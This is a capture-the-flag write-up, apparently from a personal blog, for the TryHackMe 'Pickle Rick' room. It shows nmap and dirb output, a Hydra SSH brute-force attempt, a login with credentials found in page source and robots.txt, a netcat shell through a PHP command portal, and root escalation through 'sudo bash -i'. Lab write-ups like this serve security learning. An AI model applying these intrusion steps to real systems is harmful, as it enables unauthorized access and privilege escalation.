---
categories:
- Tryhackme
- CTF
layout: post
image:
    path: hacking.png
media_subpath: /assets/posts/2025-03-29-Pickle-Rick-THM
tags:
- CTF
- Fundamentals
- Tryhackme
title: THM - Starters - Pickle Rick
---

## Introduction

**A Rick and Morty CTF. Help turn Rick back into a human!**

![](2025-03-29-11-13.png)


## Enumeration

````
Nmap scan report for thm.machine
Host is up (0.056s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
````

As said in the instructions, I will dig deeper in to the web application of this server. 


![](2025-03-29-11-28.png)

Repeating the words "Burp" assuming this is a reference of the webtesting tool called Burpsuite.
There was also some gibberish in the /robots.txt file and a username stored in the sourcecode in a comment. This username could be used for bruteforcing the SSH with Hydra. There was no exploits in the Metasploit Framework for this version of Apache (2.4.41).

![](2025-03-29-11-40.png)

````
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
````

SSH-service did not have password authentication on, so I cannot proceed further with the bruteforcing.
````
[DATA] attacking ssh://10.x.x.x:22/
[ERROR] target ssh://10.x.x.x:22/ does not support password authentication (method reply 4).
````

Let's check if there is any other directories available with Dirb.

````
---- Scanning URL: http://10.x.x.x/ ----
==> DIRECTORY: 
+ http://10.x.x.x/assets/                                                                         
+ http://10.x.x.x/index.html                                                           
+ http://10.x.x.x/robots.txt                                                            
+ http://10.x.x.x/login.php
+ http://10.x.x.x/server-status
````

The login.php seems to be the right way to use that username.

![](2025-03-29-11-58.png)

Using the username "R1ckRul3s" and string found from /robots.txt, I was able to gain access to this portal.

![](2025-03-29-11-26.png)

It seems you can now access to the backend server and execute commands. "ls": 

![](2025-03-29-11-01.png)

This page supports PHP, now I want to gain a better shell. By using PHP-shell command I was able to grab a session with netcat.
![](2025-03-29-11-25.png)
````
$ ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
$ cat Sup3rS3cretPickl3Ingred.txt
mr. *** *** <-- first question answer >
$ 
````
````
$ cat clue.txt	
Look around the file system for the other ingredient.
````
Under /home directory there was a user called "rick", which had the second ingredient.

````
$ cd rick
$ ls
second ingredients
$ cat "second ingredients"
1 j**** **** <-- Second answer >
````

"sudo -l" result was interesting. All commands can be run with root privileges. 

````
User www-data may run the following commands on ip-10-x-x-x:
    (ALL) NOPASSWD: ALL
````
````
sudo bash -i
bash: cannot set terminal process group (1023): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-x-x-x:/home/rick# 
````
Now let's go to /root to grab the last flag.

````
root@ip-10-x-x-x:~# cat 3rd.txt
cat 3rd.txt
3rd ingredients: fle*** *****
````


